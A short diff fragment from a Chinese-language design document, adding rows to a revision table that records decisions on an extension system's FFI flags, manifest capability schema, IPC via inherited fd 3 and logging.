+| FFI / inspector / addons | 未控 | `--allow-ffi/-inspector/-addons` 默认禁 | **不 gate** |
+| manifest capabilities | `process: { allow: [...] }` 复杂结构 | `[{path, mode}]` + 平台变量 | **撤回**；schema 接受但不解释 |
+| α 安全实施工程量 | ~5 天 | ~3 天 | 撤回后净减码 ~1500 行 |
+| IPC | Unix socket / Named Pipe | Inherited fd 3 | **保留** fd 3 |
+| 扩展日志系统 | 未设计 | 入 v1 | **保留**（剥离 audit 框架后仍承担操作日志） |
 
 ## 16.1 Phase 0 评议引入的修订（v0.3 → v0.3-patched）
 
